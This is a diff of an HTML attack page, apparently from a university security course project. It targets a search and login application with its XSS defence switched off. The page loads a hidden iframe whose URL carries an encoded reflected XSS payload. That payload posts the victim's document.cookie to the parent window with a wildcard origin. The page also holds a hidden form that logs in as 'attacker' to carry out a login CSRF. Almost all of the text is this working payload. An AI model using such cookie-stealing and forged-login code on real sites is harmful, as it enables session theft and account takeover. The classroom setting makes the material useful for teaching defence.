@@ -7,10 +7,10 @@
 
 <!-- q=<script>$(document).ready(function() {window.parent.postMessage(window.document.cookie, '*'); })</script> -->
 
-<iframe name= "output_frame" id="output_frame" style="display:none" src="http://cis551.cis.upenn.edu/project3/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3E%24%28document%29.ready%28function%28%29%20%7B%20window.parent.postMessage%28window.document.cookie%2C%20%27%2A%27%29%3B%20%7D%29%3C%2Fscript%3E" >
+<iframe name= "output_frame" id="output_frame" style="display:none" src="pro/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3E%24%28document%29.ready%28function%28%29%20%7B%20window.parent.postMessage%28window.document.cookie%2C%20%27%2A%27%29%3B%20%7D%29%3C%2Fscript%3E" >
 </iframe> 
 
-<form id="csrf_form" action="http://cis551.cis.upenn.edu/project3/login?csrfdefense=1&xssdefense=0" method="POST" target="output_frame">
+<form id="csrf_form" action="pro/login?csrfdefense=1&xssdefense=0" method="POST" target="output_frame">
 <input type="hidden" name="username" id="username" value="attacker"/>
 <input type="hidden" name="password" id="password" value="123456"/>
 <input type="hidden" name="csrf_token" id="csrf_token" />
